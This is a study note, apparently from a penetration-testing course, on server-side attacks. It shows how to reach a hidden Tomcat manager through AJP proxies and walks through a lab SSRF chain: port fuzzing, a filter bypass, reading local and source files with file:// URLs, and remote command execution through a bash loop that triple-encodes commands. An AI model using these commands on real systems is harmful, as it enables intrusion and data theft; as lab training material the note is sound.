# Server Side Attacks

## Introduction to Server Side Attacks

server side attacks target the app or service provided by a server, whereas a client-side attack attacks the client  

CSRF attacks use other client-side attacks like XSS to perform requests to a web app that a victim is already authenticated to   
therefore, the client is the target   

server-side attacks target the actual application with the objective being to leak sensitive data or inject unwanted input to possibly achieve RCE   
targets in this situation are the back-end services 

### Types of server-side attacks 

- `abusing intermediary applications` - accessing internal apps not accessible from our network by leveraging specific exposed binary protocols 
- `server side request forgery SSRF` - making host app server issue requests to arbitrary external domains or internal resources to attempt to id sensitive data 
- `server-side includes injection SSI` - injecting payload so that ill-intended server-side include directives are parsed to get RCE or leak sensitive data. Occurs when poorly validated user input becomes part of a response that is parsed for server-side include directives 
- `edge-side includes injection ESI` - ESI is an XML-based markup languages used to tackle performance issues by temp storing dynamic web content that normal web caching doesn't save. Occurs when attacker reflects ill-intended ESI tags in the HTTP response. Root cause is that HTTP surrogates can't validate the ESI tag origin so they will execute all of them regardless if they are malicious 
- `server-side template injection SSTI` - template engines facilitate dynamic data presentation through web pages or emails. SSTI injects malicious template directives inside a template which leverages template engines that mix user input with a given template 
- `extensible stylesheet language transformations server-side injections XSLT` - XSLT is an XML-based languages usually used when converting XML to HTML, another XML, or PDF. XSLT can occur when arbitrary XSLT file upload is possible or when the app generates XSL transformation's XML document dynamically using unvalidated input

## AJP Proxy 

AJP or JK is a wire protocol   
optimized version of the HTTP protocol to allow a standalone web server like Apache to talk to Tomcat   
usually apache is much faster than tomcat at serving static content to it tries to server static content when possible then proxy the request to tomcat for tomcat related content 

AJP proxy ports = 8009 TCP; may be able to use them to access hidden apache tomcat manager behind them   
AJP proxy is a binary protocol but we can make our own Nginx or apache web server with AJP modules to interact with it   
can discover admin panels, apps, and sites that otherwise would be inaccessible 

if you want to generate your own vulnerable environment you can start an apache tomcat docker exposing only the AJP proxy: 

first create file `tomcat-users.xml`

```xml
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>
```

then install the docker package in your local machine and start the apache tomcat server: 

```shell 
sudo apt install docker.io
sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
```

## Nginx Reverse Proxy & AJP 

when we find an open AJP proxy port 8009 we can use nginx with an `ajp_module` to access the hidden tomcat manager   

we can compile the nginx source code and add the required module by doing: 
- download the nginx source 
- download the required module 
- compile nginx source code with `ajp_module` 
- create config file pointing to AJP port 

download the nginx source code: 

```shell
wget https://nginx.org/download/nginx-1.21.3.tar.gz
tar -xzvf nginx-1.21.3.tar.gz
```

compile the nginx source code with the ajp module: 

```shell
git clone https://github.com/dvershinin/nginx_ajp_module.git
cd nginx-1.21.3
sudo apt install libpcre3-dev
./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
make
sudo make install
nginx -V
```

note that the following will setup on port 8009 which is what we normally will use but for the exercise purposes we will need to use the spawned target's IP and port 

comment out the entire `server` block and append the following lines to the `http` block in `/etc/nginx/conf/nginx.conf`: 

```
upstream tomcats {
	server <TARGET_SERVER>:8009;
	keepalive 10;
	}
server {
	listen 80;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}
```

![](Images/Pasted%20image%2020240212115855.png)

![](Images/Pasted%20image%2020240212120927.png)

![](Images/Pasted%20image%2020240212120355.png)

note that in the above we also changed `listen 80` to 8080

start nginx and check if everything is working correctly with a curl request to your local host: 

![](Images/Pasted%20image%2020240212120856.png)

## Apache Reverse Proxy and AJP 

connecting to AJP with apache is much simpler because the AJP module is precompiled for us but we will still need to install it 

we can configure the AJP-proxy in our apache server as follows: 
- install the `libapache2-mod-jk` package
- enable the module 
- create the config file pointing to the AJP-proxy port 

again, apache will default use port 80 but we can change this in `/etc/apache2/ports.conf`   
if we are doing this on port 8080 remember that we just ran nginx on there so we would also need to do `sudo nginx -s stop`  
and again in the following exercise we would normally use port 8009 but will instead use the spawned target's IP and port 

listen on 8080: 

![](Images/Pasted%20image%2020240212122526.png)

setup the required commands and config files: 

```shell
sudo apt install libapache2-mod-jk
sudo a2enmod proxy_ajp
sudo a2enmod proxy_http
export TARGET="<TARGET_IP>"
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
sudo systemctl start apache2
```

for the example it would be: 

```shell
sudo apt install libapache2-mod-jk
sudo a2enmod proxy_ajp
sudo a2enmod proxy_http
export TARGET="83.136.253.251"
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:41513/
ProxyPassReverse / ajp://$TARGET:41513/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
sudo systemctl start apache2
```

then curl to localhost (with alternative port if necessary): 

![](Images/Pasted%20image%2020240212122656.png)

note that with this configuration we will also be able to view this in our web browser: 

![](Images/Pasted%20image%2020240212122807.png)

## Server-Side Request Forgery (SSRF) Overview 

SSRF attacks let us abuse server functionality to perform internal or external resource requests on behalf of the server   
to do this we usually need to supply or modify urls used by the target app to read or submit data 

exploiting SSRF can lead to: 
- interacting with known internal systems 
- discovering internal services with port scans 
- disclosing local/sensitive data 
- including files in the target app 
- leaking NetNTLM hashes using UNC paths (windows)
- achieving RCE 

we can usually find SSRF in apps that fetch remote resources  
when looking for SSRF we should look for: 
- parts of HTTP requests, including URLs 
- file imports such as HTML, PDFs, images, etc. 
- remote server connections to fetch data 
- API specification imports 
- dashboards including ping and similar functionalities to check server statuses 

fuzzing can be extended to parts of the HTTP-request like the `User-Agent` to help find SSRF 

## SSRF Exploitation Example 

with our target we can work to exploit multiple SSRF vulnerabilities to gain RCE on an internal host with the following attack chain: 

pentester -> exercise-target SSRF -> internal webserver SSRF -> localhost webapp -> RCE 

basic recon on our target shows 3 open ports: 

![](Images/Pasted%20image%2020240212145435.png)

now lets do a silent curl request to get the protocol response headers 

`curl -i -s http://target`

![](Images/Pasted%20image%2020240212145536.png)

from this we can see that the request redirected to `/load?q=index.html` meaning that the `q` parameter fetches the resource `index.html` 

now lets try to follow the redirect with `-L`: 

![](Images/Pasted%20image%2020240212145716.png)

now we can see `ubuntu-web.lalaguna.local` and `internet.app.local` which are apps on the internal network (inaccessible from our current position)

now we want to see if the `q` parameter is open to SSRF, and if it is we may be able to reach the `internal.app.local` web app   
"may" because a trust relationship between `ubuntu-web` and `internal.app.local` likely exists   
this type of relationship can be something like a firewall rule or lack of a firewall rule

lets start by listening on port 8080: 

![](Images/Pasted%20image%2020240212155955.png)

then we can issue a request to the target web app with `http://<VPN/TUN adapter IP>` instead of `index.html` in the `q` parameter 

![](Images/Pasted%20image%2020240212160347.png)

we can see the response of a request issued by the target server using python-urllib on our netcat listener: 

![](Images/Pasted%20image%2020240212160335.png)

`python-urllib` supports `file`, `http`, and `ftp` schemas, so we can read local files via the `file` schema and remote files using `ftp` 

we can test the functionality by completing a few steps 

first we create a file called `index.html` 

```html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

then in the same directory we start an HTTP server using `python3 -m http.server 9090`: 

![](Images/Pasted%20image%2020240212160847.png)

then again in the same directory start an FTP server with: 

```shell
sudo pip3 install twisted
sudo python3 -m twisted ftp -p 21 -r .
```

![](Images/Pasted%20image%2020240212161124.png)

retrieve `index.html` through FTP:

`curl -i -s "http://<target>/load?q=ftp://<VPN/TUN adapter IP>/index.html`

![](Images/Pasted%20image%2020240212161734.png)

you can also retrieve `index.html` through the target app using http: 

`curl -i -s "http://<target>/load?q=http://10.10.15.54:9090/index.html`

![](Images/Pasted%20image%2020240212161228.png)

then you can retrieve local files through the target app with the file schema: 

![](Images/Pasted%20image%2020240212161329.png)

fetching these remote HTML files can lead to reflected XSS 

we've only seen two open ports on the target server but there is a possibility of internal apps existing and listening only on localhost   

we can use ffuf to fuzz for internal apps

first we can generate a wordlist containing all possible ports with: 

`for port in {1..65535}; do echo $port >> ports.txt;done`

issue a request to a random port to get the response size of a request for a false or non-existent service: 

`curl -i -s "http://<target>/load?q=http://127.0.0.1:1` 

![](Images/Pasted%20image%2020240212171333.png)

use ffuf with the wordlist and filter the responses by size: 

![](Images/Pasted%20image%2020240212171524.png)

we can see that port 5000 is another listening app: 

![](Images/Pasted%20image%2020240212172234.png)

we can now send a request to the port: 

![](Images/Pasted%20image%2020240212172820.png)

now to hopefully achieve RCE we can start by issuing a curl request to the internal app that we discovered previously: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=index.html"`

![](Images/Pasted%20image%2020240212173201.png)

we can again find any web apps listening on the localhost, lets first issue a request to a random port to see how closed port responses look: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"`

![](Images/Pasted%20image%2020240212173450.png)

we got `unknown url type` which means that the web app appears to be removing `://` from our request which we can get around by manipulating the url: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"`

![](Images/Pasted%20image%2020240212173641.png)

now we get a connection response but it includes content based on the resource we are trying to fetch, so if we used this size of the response it wouldn't filter much out  
instead we can use regex for filtering: 

`ffuf -w ./ports.txt:PORT -u "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'`

![](Images/Pasted%20image%2020240212174152.png)

again we have found an application listening on port 5000

we can use the same tactics of sending a request to the 3rd app: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/`

![](Images/Pasted%20image%2020240212174426.png)

we have now successfully accomplished: 
- issue requests on behalf of ubuntu-web to internal.app.local
- reach a web app listening on port 5000 inside of internal.app.local, chaining two SSRF vulnerabilities 
- disclose a list of files via the internal app 

now we can use the files to uncover source code to see how we might achieve RCE 

lets issue a request to disclose `/proc/self/environ` where the current path should be present under the `PWD` env variable: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -`

![](Images/Pasted%20image%2020240212174819.png)

we can see from the response that `PWD=/app` and there is a list of interesting files, lets look at `internal_local.py`: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"`

![](Images/Pasted%20image%2020240212180129.png)

looking at the code we can see functionality that lets us execute commands on the remote host by sending a GET request to `/runme?x=<cmd>`

lets try with: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"`

![](Images/Pasted%20image%2020240212180510.png)

from this we can see that we are the root user and we can execute commands, but what if we submit a command with arguments like: 

`runme?x=uname -a`

![](Images/Pasted%20image%2020240212180702.png)

because we are going through 3 applications, we will need to encode our special characters 3 times, like we did with the `http::////` 

can install jq to help encode: 

```shell
sudo apt-get install jq
echo "encode me" | jq -sRr @uri
```

then we can make a bash function to automate executing commands on the target app: 

```bash
function rce() {
function> while true; do
function while> echo -n "# "; read cmd
function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
function while> echo ""
function while> done
function> }
```

then use `rce` to run or use encoder to find flag

![](Images/Pasted%20image%2020240212192951.png)

